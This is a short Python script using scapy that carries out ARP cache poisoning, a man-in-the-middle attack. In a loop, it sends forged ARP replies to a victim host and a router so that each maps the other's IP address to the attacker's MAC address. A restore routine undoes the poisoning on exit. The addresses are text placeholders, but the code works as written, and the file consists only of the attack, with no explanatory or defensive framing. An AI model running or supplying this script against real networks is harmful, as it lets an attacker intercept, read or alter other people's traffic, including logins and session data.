from scapy.all import *
import time

def Victim():
    
    X = ARP()
    X.op = 2
    X.pdst = "Victim IP Addr"
    X.hwdst = "Victim Mac Addr"
    X.hwsrc = "Attacker Mac Addr"

    X.psrc = "Router Ip Addr"
    send(X)

def Router():
    
    X = ARP()
    X.op = 2
    X.pdst = "Router Ip Addr"
    X.hwdst = "Router Mac Addr"
    X.hwsrc = "Attacker Mac Addr"

    X.psrc = "Victim Ip Addr"
    send(X)


def restore():

    
    X = ARP()
    X.op = 2
    X.pdst = "Victim Ip addr"
    X.hwdst = "Victim Mac Addr"
    X.hwsrc = "Router Mac Addr"
    X.psrc = "Router Ip Addr"
    send(X)


 
    X = ARP()
    X.op = 2
    X.pdst = "Router Ip Addr"
    X.hwdst = "Router Mac Addr"
    X.hwsrc = "Victim Mac Addr"
    X.psrc = "Victim Ip Addr"
    send(X)




if __name__ == "__main__":
    try:
        while True:
        
            Victim()
            Router()
            time.sleep(2)
    except KeyboardInterrupt as err:
        print("Restoring Everything Back")
        restore()
        print("EXIT") 
